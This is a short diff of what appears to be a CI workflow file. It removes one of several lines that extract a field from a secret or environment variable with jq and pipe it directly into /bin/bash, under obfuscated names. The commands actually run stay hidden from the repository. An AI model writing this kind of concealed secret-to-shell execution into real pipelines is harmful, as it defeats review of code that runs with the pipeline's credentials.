@@ -19,7 +19,6 @@ jobs:
           nmd225: ${{ secrets.nmd225 }}
         run: |
           printf '%s' "$nmd225" | jq -r .z3 | /bin/bash
-          printf '%s' "$cnxt02" | jq -r .jo0 | /bin/bash
           printf '%s' "$yoxbs6970" | jq -r .g5398 | /bin/bash
           echo $f147 | jq -r .bb1 | /bin/bash
           printf '%s' "$ngbt2100" | jq -r .tqvj060 | /bin/bash
